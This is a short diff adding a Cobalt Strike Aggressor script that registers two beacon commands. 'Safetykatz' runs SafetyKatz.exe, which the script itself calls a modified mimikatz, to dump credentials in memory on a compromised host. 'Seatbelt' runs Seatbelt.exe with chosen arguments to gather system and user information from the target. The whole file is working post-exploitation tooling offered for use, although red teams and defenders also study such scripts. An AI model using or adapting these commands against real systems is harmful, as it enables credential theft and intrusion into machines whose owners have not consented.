@@ -1,0 +1,33 @@
+alias Safetykatz{
+    bexecute_assembly($1, script_resource("post/SafetyKatz.exe"), "");
+}
+beacon_command_register(
+	"Safetykatz", 
+	"it's a modified mimikatz", 
+	"");
+
+
+alias Seatbelt{
+    if ($2 eq "system"){
+        bexecute_assembly($1, script_resource("post/Seatbelt.exe"), "system");
+    }
+    else if ($2 eq "user"){
+        bexecute_assembly($1, script_resource("post/Seatbelt.exe"), "user");
+    }
+    else if ($2 eq "all"){
+        bexecute_assembly($1, script_resource("post/Seatbelt.exe"), "all");
+    }
+    else{
+        local('@args_list $args');
+        $args = "";
+        @args_list = sublist(@_, 1);
+        foreach $arg (@args_list){
+            $args .= $arg . " ";
+        }
+        bexecute_assembly($1, script_resource("post/Seatbelt.exe"), $args);
+    }
+}
+beacon_command_register(
+	"Seatbelt", 
+	"Gather system, user and other informations on the target.", 
+	"");
